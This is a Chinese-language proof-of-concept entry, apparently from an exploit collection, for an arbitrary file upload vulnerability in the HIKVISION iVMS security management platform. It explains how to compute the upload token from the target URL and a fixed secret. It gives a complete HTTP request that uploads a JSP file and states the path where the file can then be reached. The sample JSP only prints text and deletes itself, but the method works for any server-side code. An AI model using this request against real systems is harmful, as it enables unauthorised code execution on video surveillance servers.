﻿# HIKVISION iVMS综合安防管理平台 resourceOperations 任意文件上传

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：若目标为http://www.example.com/，则Token为MD5(http://www.example.com/eps/api/resourceOperations/uploadsecretKeyIbuilding)，即Token=54590E37F79DF000549B9FAA536D23B3
成功上传文件后，会显示resourceUuid的值，拼接URL即可访问上传的文件；http://xxx.xxx.xxx.xxx/eps/upload/{resourceUuid值}.jsp

> 漏洞特征：

> 验证脚本：HTTP

```
POST /eps/api/resourceOperations/upload?token=Token HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
Accept-Encoding: gzip, deflate
Connection: close

------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader"; filename="test.jsp"
Content-Type: image/jpeg

<%out.print("hello world");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：HIKVISION iVMS综合安防管理平台 resourceOperations 任意文件上传.poc
